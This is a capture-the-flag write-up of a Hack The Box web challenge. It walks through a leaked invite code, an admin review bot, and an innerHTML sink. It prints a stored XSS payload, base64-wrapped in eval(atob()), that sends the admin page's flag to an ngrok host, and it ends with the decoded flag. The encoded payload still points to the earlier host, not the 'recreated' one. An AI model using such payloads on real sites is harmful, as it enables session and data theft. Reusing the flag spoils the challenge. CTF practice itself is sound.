---
title: "HTB Challenge - Blackout ops Writeup"
date: 2026-11-17 13:54:00 +0700
categories: [HackTheBox, Challenges]
tags: [easy]
---
## P0
First of all, access to the website with browser:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_08-43.png){: w="700" }

After registering, I try to login and find out a strange function like below:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_08-45.png){: w="700" }

But it does not allow me to use:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_08-46.png){: w="700" }

It requires me to `verify account` first before using. So click `VERIFY ACCOUNT`:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_08-47.png){: w="700" }

`New code has been sent to your email` But we are using a fake email for this challenge, where does it send to :D. So I fastly recheck its requests on BurpSuite and luckify find out this:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_08-49.png){: w="700" }

Wow, `inviteCode` is sent directly in response. Now we successfully verify our account. Next we come back with the `incident report` function again.<br>

Here, we need to review a little bit about the source code which is responsible for this `incident report` function, specifially in `challenge/graphql/resolvers.js` file.

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-17_20-00.png){: w="700" }

We can see that, this function receives inputs from user, one of them is a `evidenceUrl`. After that, it will require a bot to visite that `evidenceUrl` by using `goto` command:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-17_20-00_1.png){: w="700" }

As we can see in `challenge/bot.js` file, this bot is using `puppeteer` to review the `evidenceUrl`. First of all, bot will go to `http://127.0.0.1:1337`.<br>

Review `config/nginx.conf` file, we can see that port 1337 is forwarding request to `http://127.0.0.1:3000` proxy. Meanwhile, at `challenge/app.js` file, we can see that the main application is running on port 3000. So summary, `http://127.0.0.1:1337` is the challenge website itself.

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-03.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-03_1.png){: w="700" }

Back to source code of bot in `bot.js`, after going to `http://127.0.0.1:1337`, it will use `admin` credentials to login. This means bot reviews incident reports as admin user. Great !!

After logining successfully, it will goto the url submited as `evidenceUrl` by user by running `await page.goto(url)`. Because the bot is using admin session, so if the url which bot visit contains `XSS` payload, we can capture data of its session. So the problem now is we must decide the url which we will use to fill in `evidenceUrl` before sending to backend.

To find out a suitable url, we continue review `challenge/routes/pages.js` and detect that `/admin` path requires `admin` session and it aslo renders flag directly to.

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-17_19-57.png){: w="700" }

Continue to look at `challenge/views/admin.html`, we can see that flag is rendered in `<h4>` tag. In addition to, it contains a javascript code which will insert all incident reports to element which has id `reports-container`. Luckily, it uses `innerHTML`. This means we can easily insert any XSS payload we like by abusing value in report fields :D

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-17_19-58.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-17_19-59.png){: w="700" }

## P1 & P2
So now, we have all indeed materials to successfully exploit this challenge. First of all, check the request which is used for submiting incident report in burpsuite:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-37.png){: w="700" }

As we can see, this request body is graphql and it has many `'` as well as `"`. Therefore, to avoid syntax errors, it is advisable to use a base64-encoded form payload of XSS.
```
const f = document.querySelector('h4').textContent;
fetch('https://8327-104-28-205-74.ngrok-free.app?data=' + btoa(f), { headers: { 'ngrok-skip-browser-warning': '1' } });
```
To verify whether this payload can run truely, we need to copy `fetch()` command to a browser console to check first but it fails like this:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-47.png){: w="700" }

Why does it fail ? Because our request is using a custom header `ngrok-skip-browser-warning` so browser immediately make a preflight request to server (default browser policy). But our present server with ngrok is just created by running `python3 -m http.server` so that is the reason why it fails like below image.

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-51.png){: w="700" }

So we need to develop a new local server which can handle preflight request and then attach it with ngrok for public. I write a new code in `cors_exfil_listener.py` run it

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-54.png){: w="700" }

Recreate a new payload:
```
const f = document.querySelector('h4').textContent;
fetch('https://5f60-104-28-205-74.ngrok-free.app?data=' + btoa(f), { headers: { 'ngrok-skip-browser-warning': '1' } });
```

Next we will convert above payload to base64 format and put it directly in `eval(atob(base64))`

```
<img src=x onerror=eval(atob('Y29uc3QgZiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2g0JykudGV4dENvbnRlbnQ7CmZldGNoKCdodHRwczovLzgzMjctMTA0LTI4LTIwNS03NC5uZ3Jvay1mcmVlLmFwcD9kYXRhPScgKyBidG9hKGYpLCB7IGhlYWRlcnM6IHsgJ25ncm9rLXNraXAtYnJvd3Nlci13YXJuaW5nJzogJzEnIH0gfSk7'))>
```
Now we have a completed payload. Next we can put this payload to the request. Remember to set `evidenceUrl` is `http://127.0.0.1:1337/admin` and send:

![Upgrade_Notice.pdf](assets/image/htb-challenges/blackout_ops/2026-11-18_09-59.png){: w="700" }

Review on our local server, we can find out the flag but in base64 format. Now we only need to decode it:
```
└─$ echo "SFRCe2wwMGswdXRfZjA0X211bHQxcDRydF9ieVA0NTVfNG5kX2dyNHBoUUxfYnVnNX0=" | base64 -d
HTB{l00k0ut_f04_mult1p4rt_byP455_4nd_gr4phQL_bug5} 
```